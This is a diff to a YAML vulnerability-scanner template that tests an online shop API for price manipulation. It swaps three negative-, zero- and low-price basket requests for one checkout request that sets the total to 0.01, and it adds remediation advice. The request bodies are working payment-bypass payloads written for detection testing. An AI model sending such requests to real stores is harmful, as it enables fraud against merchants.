@@ -10,50 +10,23 @@ info:
     - payment-bypass
 
 requests:
-  - name: Add item with negative price
+  - name: Checkout with modified total
     method: POST
-    path: /api/BasketItems/
+    path: /rest/basket/{{basket_id}}/checkout
     headers:
       Authorization: "{{bearer_token}}"
       Content-Type: application/json
-    body: '{"ProductId": 1, "quantity": 1, "price": -999.99, "basketId": "{{basket_id}}"}'
+    body: '{"couponData": "bnVsbA==", "orderDetails": {"totalPrice": 0.01}}'
+    matchers_condition: and
     matchers:
       - type: status
         values: [200, 201]
-      - type: json
-        selector: "$.data"
-        condition: exists
+      - type: word
+        words:
+          - '"orderConfirmation"'
+          - '"status":"success"'
+        condition: or
     on_match:
       vulnerability: PRICE_MANIPULATION
-      message: Server accepts client-provided price parameter - business logic flaw allows price tampering
-      remediation: Never trust client-provided price; always retrieve from server-side product catalog
-
-  - name: Add item with zero price
-    method: POST
-    path: /api/BasketItems/
-    headers:
-      Authorization: "{{bearer_token}}"
-      Content-Type: application/json
-    body: '{"ProductId": 1, "quantity": 1, "price": 0, "basketId": "{{basket_id}}"}'
-    matchers:
-      - type: status
-        values: [200, 201]
-    on_match:
-      vulnerability: PRICE_MANIPULATION
-      message: Zero price accepted - free items possible
-      remediation: Price must always come from server-side product catalog
-
-  - name: Add item with manipulated price
-    method: POST
-    path: /api/BasketItems/
-    headers:
-      Authorization: "{{bearer_token}}"
-      Content-Type: application/json
-    body: '{"ProductId": 1, "quantity": 1, "price": 0.01, "basketId": "{{basket_id}}"}'
-    matchers:
-      - type: status
-        values: [200, 201]
-    on_match:
-      vulnerability: PRICE_MANIPULATION
-      message: Price override allowed - payment amount manipulation possible
-      remediation: Remove price parameter from basket item creation; enforce server-side pricing
+      message: Checkout accepts modified total price - payment bypass possible
+      remediation: Always calculate total server-side; never trust client-provided totals
